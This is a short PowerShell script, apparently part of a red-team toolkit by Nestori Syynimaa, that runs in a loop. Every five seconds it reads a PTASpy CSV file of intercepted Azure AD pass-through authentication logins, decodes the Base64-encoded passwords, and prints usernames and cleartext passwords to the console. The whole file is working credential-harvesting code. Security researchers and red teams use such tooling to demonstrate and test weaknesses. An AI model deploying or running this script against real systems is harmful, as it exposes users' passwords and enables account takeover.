<#
    .SYNOPSIS
    Dumps credentials from C:\PTASpy\PTASpy.csv

    .DESCRIPTION
    Dumps credentials from C:\PTASpy\PTASpy.csv every 5 seconds
    
    .Example
    .\DumpCredentials.ps1 

    .NOTES
    Version: 1.0
    Author:  @DrAzureAD (Dr Nestori Syynimaa)
    Date:    Sep 15 2022
#>

# Unix epoch time (1.1.1970)
$epoch = Get-Date -Day 1 -Month 1 -Year 1970 -Hour 0 -Minute 0 -Second 0 -Millisecond 0 
$fileName = "C:\PTASpy\PTASpy.csv"

$uNameLen = 40

while($true)
{
    Clear-Host 
    Write-Host ("{0,-19} {1,-$uNameLen} {2}" -f "Timestamp","Username","Password")
    Write-Host ("{0,-19} {1,-$uNameLen} {2}" -f "---------","--------","--------")

    # Get the file (might not exist yet)
    $fileContent = Get-Content $fileName -ErrorAction SilentlyContinue

    # Loop through the file
    foreach($row in $fileContent)
    {
        if(![String]::IsNullOrEmpty($row.Trim()))
        {
            $values = $row.Split(",")
            $timeStamp = $epoch.AddSeconds([int]$values[2])

            Write-Host ("{0} {1,-$uNameLen} {2}" -f $timeStamp.ToString("o", [cultureinfo]::InvariantCulture).Substring(0,19),$values[0],[System.Text.Encoding]::Unicode.GetString( [System.Convert]::FromBase64String($values[3])))
         }
    }
    Start-Sleep -Seconds 5
}
